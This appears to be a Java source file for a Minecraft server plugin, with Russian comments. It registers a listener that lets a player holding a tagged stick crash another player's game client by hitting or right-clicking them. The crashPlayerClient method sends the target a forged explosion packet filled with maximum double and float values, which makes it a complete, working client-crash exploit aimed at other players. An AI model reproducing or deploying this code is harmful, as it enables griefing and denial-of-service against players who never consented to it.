package org.k0rv1nes.skyMinePCrash.listeners;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.persistence.PersistentDataContainer;
import org.bukkit.persistence.PersistentDataType;
import org.k0rv1nes.skyMinePCrash.SkyMinePCrash;

import java.lang.reflect.InvocationTargetException;

public class CrashEventListener implements Listener {
    private final ProtocolManager manager = SkyMinePCrash.getManager();

    @EventHandler
    public void onPlayerRightClickEntity(PlayerInteractEntityEvent event) {
        Player player = event.getPlayer();
        Entity clickedEntity = event.getRightClicked();

        // Проверяем, что цель — игрок
        if (clickedEntity instanceof Player target) {
            processInteraction(player, target);
        }
    }

    @EventHandler
    public void onPlayerLeftClickEntity(EntityDamageByEntityEvent event) {
        // Проверяем, что атакующий — игрок, а цель — тоже игрок
        if (event.getDamager() instanceof Player attacker && event.getEntity() instanceof Player target) {
            processInteraction(attacker, target);
        }
    }

    private void processInteraction(Player player, Player target) {
        ItemStack item = player.getInventory().getItemInMainHand();

        // Проверяем, что предмет в руке — палка с уникальными метаданными
        if (isCrashStick(item)) {
            crashPlayerClient(target);

            String uniqueID = getUniqueID(item);
            String message = SkyMinePCrash.getInstance().getConfig()
                    .getString("messages.success")
                    .replace("%player%", player.getName());
            player.sendMessage(message + " (Unique ID: " + uniqueID + ")");
        } else {
            player.sendMessage("Вы должны использовать правильный предмет для этой операции!");
        }
    }

    private boolean isCrashStick(ItemStack item) {
        if (item == null || item.getType() != Material.STICK || !item.hasItemMeta()) {
            return false;
        }
        NamespacedKey key = new NamespacedKey(SkyMinePCrash.getInstance(), "unique_id");
        ItemMeta itemMeta = item.getItemMeta();
        PersistentDataContainer dataContainer = itemMeta.getPersistentDataContainer();
        return dataContainer.has(key, PersistentDataType.STRING);
    }

    private String getUniqueID(ItemStack item) {
        ItemMeta itemMeta = item.getItemMeta();
        NamespacedKey key = new NamespacedKey(SkyMinePCrash.getInstance(), "unique_id");
        PersistentDataContainer dataContainer = itemMeta.getPersistentDataContainer();
        return dataContainer.get(key, PersistentDataType.STRING);
    }

    public void crashPlayerClient(Player target) {
        PacketContainer fakeExplosion = this.manager.createPacket(PacketType.Play.Server.EXPLOSION);
        fakeExplosion.getDoubles().write(0, Double.MAX_VALUE);
        fakeExplosion.getDoubles().write(1, Double.MAX_VALUE);
        fakeExplosion.getDoubles().write(2, Double.MAX_VALUE);
        fakeExplosion.getFloat().write(0, Float.MAX_VALUE);
        fakeExplosion.getFloat().write(1, Float.MAX_VALUE);
        fakeExplosion.getFloat().write(2, Float.MAX_VALUE);

        try {
            this.manager.sendServerPacket(target, fakeExplosion);
        } catch (InvocationTargetException e) {
            throw new RuntimeException("Cannot send packet " + fakeExplosion, e);
        }
    }
}
